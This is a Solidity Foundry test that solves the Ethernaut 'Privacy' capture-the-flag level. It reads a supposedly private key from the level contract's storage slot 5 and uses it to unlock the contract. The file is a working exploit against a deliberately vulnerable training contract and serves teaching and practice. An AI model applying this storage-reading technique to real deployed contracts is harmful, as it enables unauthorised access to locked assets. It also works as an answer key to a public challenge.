// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {PrivacyFactory} from "../src/Privacy/PrivacyFactory.sol";
import {Privacy} from "../src/Privacy/Privacy.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    address payable player;

    function setUp() public {
        ethernaut = new Ethernaut();
        player = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("player")))))
        );
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testExploit() public {
        // Register level with Ethernaut contract
        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);

        // Get a new level instance
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(
            privacyFactory
        );
        Privacy privacyInstance = Privacy(payable(levelAddress));

        // Simulate exploit

        bytes16 key = bytes16(
            vm.load(address(privacyInstance), bytes32(uint256(5)))
        );

        privacyInstance.unlock(key);

        // Submit level
        bool levelSuccessFullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessFullyPassed);
    }
}
